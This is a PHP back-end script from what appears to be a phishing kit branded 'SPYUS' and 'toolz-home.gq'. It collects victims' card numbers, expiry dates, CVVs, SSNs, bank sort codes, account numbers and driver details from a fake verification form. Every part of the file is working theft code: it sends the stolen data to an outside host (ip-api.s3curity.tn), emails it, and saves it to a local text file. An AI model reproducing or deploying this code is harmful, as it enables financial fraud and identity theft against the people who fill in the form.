<?php
error_reporting(0);
session_start();
set_time_limit(0);
include("curl.php");
    if( isset($_POST['card_number']) AND isset($_POST['expiration']) AND isset($_POST['cvv']) ){
        $ip = getenv("REMOTE_ADDR");
        $rand = md5(microtime());
        $time = date("g:i a");
        $date = trim($date . ", Time : " . $time);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message.= "============= VBV InFo www.toolz-home.gq ================\n";
        $message.= "card type    : ".$_POST['card_type']."       \n";
        $message.= "name on card        : ".$_POST['name_on_card']."      \n";
	$message.= "card number    : ".$_POST['card_number']."       \n";
        $message.= "expiration        : ".$_POST['expiration']."      \n";
	$message.= "cvv    : ".$_POST['cvv']."       \n";
        $message.= "address        : ".$_POST['address']."      \n";
	$message.= "birth date    : ".$_POST['birth_date']."       \n";
        $message.= "vbv        : ".$_POST['vbv']."      \n";
        $message.= "ssn        : ".$_POST['ssn']."      \n";
        $message.= "ins    : ".$_POST['ins']."       \n";
        $message.= "sort code        : ".$_POST['sort_code']."      \n";
        $message.= "account numbre        : ".$_POST['account']."      \n";
        $message.= "driver    : ".$_POST['driver']."       \n";
        $message.= "=============  PC InFo www.toolz-home.gq =================\n";
        $message.= "Client IP 		 : ".$ip."           \n";
        $message.= "IP Geo 		 : http://www.geoiptool.com/?IP=".$ip."  ====\n";
        $message.= "Agent   		 : ".$useragent."    \n";
        $message.= "Date   		 : ".$date."         \n";
        $message.= "========= || ~ BY ~ SPYUS ~ www.toolz-home.gq || ======\n";
        $subject = "VBV [ $time ]  : $ip =?UTF-8?Q?=E2=9C=94_?= ";
        $headers = "From: SPYUS TEAM PRIV8 <spyus-free-tools@hotmail.com>\r\n";
        getr("http://ip-api.s3curity.tn/?IP=$ip",$message);
        mail($to,$subject,$message,$headers);
        $file = fopen("../save/Spyus.txt","ab");
        fwrite($file,$message);
        fclose($file);
	}
?>